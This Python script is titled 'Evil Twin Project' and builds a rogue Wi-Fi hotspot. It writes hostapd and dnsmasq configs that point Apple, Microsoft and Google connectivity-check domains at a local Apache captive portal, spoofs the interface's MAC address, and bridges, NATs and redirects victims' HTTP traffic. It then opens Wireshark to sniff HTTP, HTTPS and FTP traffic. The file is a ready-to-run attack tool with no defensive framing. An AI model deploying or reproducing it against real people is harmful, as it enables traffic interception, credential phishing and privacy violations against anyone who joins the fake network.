import subprocess
import sys
import time

def get_interfaces():
    try:
        interfaces = subprocess.check_output(["ip", "link", "show"]).decode("utf-8")
        interfaces = [line.split(":")[1].strip() for line in interfaces.split("\n") if line.strip() and ":" in line and "UNKNOWN" not in line and (line.split(":")[1].strip().startswith("eth") or line.split(":")[1].strip().startswith("wlan"))]
        return interfaces
    except subprocess.CalledProcessError as e:
        print("Error:", e)
        sys.exit(1)

def select_interface(interfaces, prompt):
    if not interfaces:
        print("No interfaces found.")
        sys.exit(1)

    print(prompt)
    valid_interfaces = []
    for i, interface in enumerate(interfaces):
        interface_info = subprocess.check_output(["ip", "addr", "show", interface]).decode("utf-8")
        status = "UP" if "state UP" in interface_info else "DOWN"
        ip_address = interface_info.split("inet ")[1].split("/")[0] if "inet " in interface_info else "N/A"
        
        print(f"{i + 1}. \033[96m{interface}\033[0m (Status: \033[92m{status}\033[0m, IP: \033[93m{ip_address}\033[0m)")
        valid_interfaces.append(interface)
        
    while True:
        choice = input("\033[1;34;40mSelect interface number: \033[0m")
        try:
            choice = int(choice)
            if choice < 1 or choice > len(valid_interfaces):
                raise ValueError
            return valid_interfaces[choice - 1]
        except (ValueError, IndexError):
            print("\033[91mInvalid choice. Please select a valid interface number.\033[0m")

def write_config_files(interface, ssid):
    hostapd_conf_icerik = f"""
interface={interface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel=7
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""

    dnsmasq_conf_icerik = f"""
interface=br0
listen-address=10.1.1.1
no-hosts
dhcp-range=10.1.1.100,10.1.1.254,10m
dhcp-option=option:router,10.1.1.1
dhcp-authoritative

address=/apple.com/10.1.1.1
address=/appleiphonecell.com/10.1.1.1
address=/airport.us/10.1.1.1
address=/akamaiedge.net/10.1.1.1
address=/akamaitechnologies.com/10.1.1.1
address=/microsoft.com/10.1.1.1
address=/msftncsi.com/10.1.1.1
address=/msftconnecttest.com/10.1.1.1
address=/google.com/10.1.1.1
address=/gstatic.com/10.1.1.1
address=/googleapis.com/10.1.1.1
address=/android.com/10.1.1.1
"""
    with open("/etc/hostapd/hostapd.conf", "w") as hostapd_conf_file:
        hostapd_conf_file.write(hostapd_conf_icerik)

    with open("/etc/dnsmasq.conf", "w") as dnsmasq_conf_file:
        dnsmasq_conf_file.write(dnsmasq_conf_icerik)

def start_access_point(internet_interface, broadcast_interface):
    try:
        subprocess.run(["service", "apache2", "start"], check=True)
        subprocess.run(["service", "dnsmasq", "start"], check=True)

        subprocess.run(["ifconfig", broadcast_interface, "down"], check=True)
        subprocess.run(["macchanger", "-A", broadcast_interface], check=True)
        subprocess.run(["ifconfig", broadcast_interface, "up"], check=True)

        subprocess.run(["hostapd", "-B", "/etc/hostapd/hostapd.conf"], check=True)

        subprocess.run(["ip", "link", "add", "name", "br0", "type", "bridge"], check=True)
        subprocess.run(["ip", "link", "set", "dev", broadcast_interface, "master", "br0"], check=True)
        subprocess.run(["ip", "addr", "add", "10.1.1.1/24", "dev", "br0"], check=True)
        subprocess.run(["ip", "link", "set", "dev", "br0", "up"], check=True)

        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], check=True)

        subprocess.run(["iptables", "--flush"], check=True)
        subprocess.run(["iptables", "-t", "nat", "--flush"], check=True)
        subprocess.run(["iptables", "-t", "nat", "-A", "POSTROUTING", "-o", internet_interface, "-j", "MASQUERADE"], check=True)
        subprocess.run(["iptables", "-A", "FORWARD", "-i", "br0", "-o", internet_interface, "-j", "ACCEPT"], check=True)
        subprocess.run(["iptables", "-A", "FORWARD", "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"], check=True)
        subprocess.run(["iptables", "-t", "nat", "-A", "PREROUTING", "-i", "br0", "-p", "tcp", "--dport", "80", "-j", "DNAT", "--to-destination", "10.1.1.1:80"], check=True)

        print("The Wi-Fi hotspot has been created successfully.")
    except subprocess.CalledProcessError as e:
        print("Error occurred:", e)
        sys.exit(1)

def show_banner():
    banner1= """
   ___________     .__.__    ___________       .__        
   \_   _____/__  _|__|  |   \__    ___/_  _  _|__| ____  
   |    __)_\  \/ /  |  |     |    |  \ \/ \/ /  |/    \ 
   |        \\   /|  |  |__   |    |   \     /|  |   |  \\
  /_______  / \_/ |__|____/   |____|    \/\_/ |__|___|  /
          \/                                          \/ 
  __________                   __               __       
  \______   \_______  ____    |__| ____   _____/  |_     
   |     ___/\_  __ \/  _ \   |  |/ __ \_/ ___\   __\    
   |    |     |  | \(  <_> )  |  \  ___/\  \___|  |      
   |____|     |__|   \____/\__|  |\___  >\___  >__|      
                          \______|    \/     \/                                       
"""

    banner2 = """
   By \033[1;32mhttps://github.com/batuhanturker\033[0m, 
      \033[1;34mhttps://github.com/aykutemreyalcin\033[0m, 
      \033[1;31mhttps://github.com/fdemirhisar\033[0m 

"""
    print(banner1)
    print(banner2)



def start_wireshark(interface):
    try:
        subprocess.run(["wireshark", "-i", interface, "-k", "-f", "tcp port 80 or tcp port 443 or ftp"], check=True)
    except subprocess.CalledProcessError as e:
        print("Error occurred:", e)

def create_override_conf():
    override_conf_icerik = """
<Directory /var/www/>
    Options Indexes FollowSymLinks MultiViews
    AllowOverride All
    Order Allow,Deny
    Allow from all
</Directory>
"""
    try:
        with open("override.conf", "w") as override_conf_file:
            override_conf_file.write(override_conf_icerik)
        
        subprocess.run(["cp", "override.conf", "/etc/apache2/conf-available/"], check=True)
        print("override.conf created /etc/apache2/conf-available/")
    except Exception as e:
        print("Error occurred:", e)

if __name__ == "__main__":
    show_banner()
    print("Script started.")

    internet_interfaces = get_interfaces()
    internet_interface = select_interface(internet_interfaces, "\033[1;34;40mSelect internet interface:\033[0m")
    print("\033[1;34;40mInternet interface selected:\033[0m", internet_interface)

    broadcast_interfaces = get_interfaces()
    broadcast_interface = select_interface(broadcast_interfaces, "\033[1;34;40mSelect broadcast interface:\033[0m")
    print("\033[1;34;40mBroadcast interface selected:\033[0m", broadcast_interface)

    ssid = input("\033[1;34;40mEnter SSID for the Wi-Fi hotspot:\033[0m ")
    create_override_conf()
    write_config_files(broadcast_interface, ssid)
    start_access_point(internet_interface, broadcast_interface)
    start_wireshark(broadcast_interface)
    time.sleep(1)
